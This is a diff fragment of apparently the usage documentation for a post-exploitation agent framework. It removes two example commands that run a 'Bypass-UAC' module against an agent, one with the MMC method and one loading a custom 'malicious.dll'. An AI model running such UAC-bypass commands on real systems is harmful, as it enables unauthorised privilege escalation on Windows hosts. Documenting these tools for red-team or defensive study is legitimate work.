@@ -235,15 +235,6 @@ run HostEnum agent_id=abc123-4567-8901-2345-67890abcdef1 switch=Local html_repor
 ```
 
 
-**Bypass-UAC with MMC method:**
-```
-run Bypass-UAC agent_id=abc123-4567-8901-2345-67890abcdef1 method=UacMethodMMC2
-```
-
-**Bypass-UAC with custom DLL:**
-```
-run Bypass-UAC agent_id=abc123-4567-8901-2345-67890abcdef1 method=UacMethodTcmsetup custom_dll=C:\\temp\\malicious.dll
-```
 
 ## Notes
 
